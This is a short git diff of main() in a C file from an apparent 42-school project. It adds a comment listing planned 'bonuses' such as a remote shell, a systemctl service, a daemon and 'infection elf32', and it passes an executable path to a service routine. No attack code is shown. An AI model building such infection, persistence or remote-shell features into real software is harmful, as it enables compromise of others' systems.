@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
-/*   Updated: 2026/05/23 14:17:49 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/05/23 17:31:43 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,6 +16,17 @@
 #include <unistd.h>
 
 void	sha256(uint8_t *msg, uint64_t len, uint8_t buf[32]);
+
+/*
+	bonuses:
+		"advanced" password system
+		service systemctl
+		remote shell
+		encryption
+		daemon
+		infection elf32
+		cd, getcwd
+*/
 
 int	main(__attribute__((unused)) int ac, char **av, char **envp)
 {
@@ -47,6 +58,6 @@ int	main(__attribute__((unused)) int ac, char **av, char **envp)
 	else if (whoami == I_AM_MAIN_PROCESS)
 		return (crawl(&exec_ctx), 0);
 	else if (whoami == I_AM_CHILD_PROCESS)
-		return (run_service(), 0);
+		return (run_service(exec_ctx.exec_path), 0);
 	return (0);
 }
